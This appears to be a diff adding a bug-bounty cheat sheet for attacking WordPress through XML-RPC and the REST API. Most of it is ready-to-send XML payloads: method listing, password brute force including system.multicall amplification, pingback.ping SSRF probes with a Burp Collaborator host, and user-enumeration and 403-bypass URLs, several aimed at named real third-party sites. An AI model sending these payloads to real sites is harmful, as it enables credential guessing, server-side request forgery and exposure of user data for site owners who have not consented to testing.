@@ -1,0 +1,62 @@
+
+XML rpc : to find availabe methods :
+POST 
+     <methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+
+1) Brute force : 
+in available methods search for : 
+      wp.getUserBlogs
+      wp.getCategories
+      metaWeblog.getUsersBlogs
+      
+      if any of above of method is availabe ,then using that method you can brute force by sending below post
+      
+      <methodCall>
+<methodName>wp.getUsersBlogs</methodName>
+<params>
+<param><value>admin</value>
+</param><param><value>password</value></param></params>
+</methodCall>
+
+multicall brute force attack => 
+<?xml version="1.0"?>
+<methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>admin</string></value><value><string>password</string></value></data></array></value></data></array></value></member></struct></value><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>admin2</string></value><value><string>password2</string></value></data></array></value></data></array></value></member></struct></value><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>admin3</string></value><value><string>password3</string></value></data></array></value></data></array></value></member></struct></value><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>admin4</string></value><value><string>password4</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>
+
+2) ***if pingback.ping is enabled then you can check for SSRF
+
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+<param><value><string>http://mndawpw1jc3nsrp40f6dz8z0yr4hs6.burpcollaborator.net</string></value>
+</param><param><value><string>https://wp.dana.id/wp-json/wp/v2/users</string></value></param></params>
+</methodCall>
+
+Final confirmation of ssrf =>
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+<param><value><string>http://adfkjdf.com:21/OSEGSDF/</string></value>
+</param><param><value><string>https://revamp.usetada.com/wp-json/wp/v2/users</string></value></param></params>
+</methodCall>
+
+if error occur with some int value ,then there is ssrf or read => https://www.pentestgeek.com/metasploit/wordpress-pingback-portscanner-metasploit-module
+
+3) Always check https://www.fedhive.com/wp-json/wp/v2/users , https://blog.mi.com/en/?rest_route=/wp/v2/users , whthere it is leaking user info or not
+
+
+4) always check the available methods for /wp-json/wp/v2/posts , if PATCH is there maybe you can modify the blogs
+
+
+
+
+https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html
+https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html
+https://hackerone.com/reports/1147449
+
+
+BYPASSING 403 of wordpress => 
+    you found wp-admin with 403 status => bypass it using /wp-admin/setup-config.php?step=1
+    or sometimes => /wp-login?normal=1
